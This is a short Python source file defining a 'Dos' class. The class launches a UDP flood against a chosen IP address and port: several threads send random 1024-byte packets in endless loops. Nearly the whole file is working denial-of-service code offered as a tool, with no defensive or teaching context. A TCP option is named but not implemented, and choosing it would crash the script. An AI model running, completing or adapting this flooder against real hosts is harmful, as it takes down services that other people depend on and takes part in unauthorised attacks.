import socket
import random
from threading import Thread

TCP = socket.SOCK_STREAM
UDP = socket.SOCK_DGRAM


class Dos():

    def __init__(self, target_ip, target_port, protocol, udp_size_bytes=1024, thread_number=4):
        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol
        self.udp_size_bytes = udp_size_bytes
        self.thread_number = thread_number

    def udp_flood(self):
        """
        UDP flood, send 1024 bytes
        """
        sock = socket.socket(socket.AF_INET, UDP)
        bytes_to_send = random._urandom(self.udp_size_bytes)  # random bytes
        while True:
            sock.sendto(bytes_to_send, (self.target_ip, self.target_port))

    def start_attack(self):
        """
        Manage threads and choose attack method
        """
        threads = []
        for _ in range(self.thread_number):
            if self.protocol != False and self.protocol != '':
                if self.protocol == UDP:
                    thread = Thread(target=self.udp_flood)
                threads.append(thread)
                thread.start()
            else:
                print('Bad method')
                return
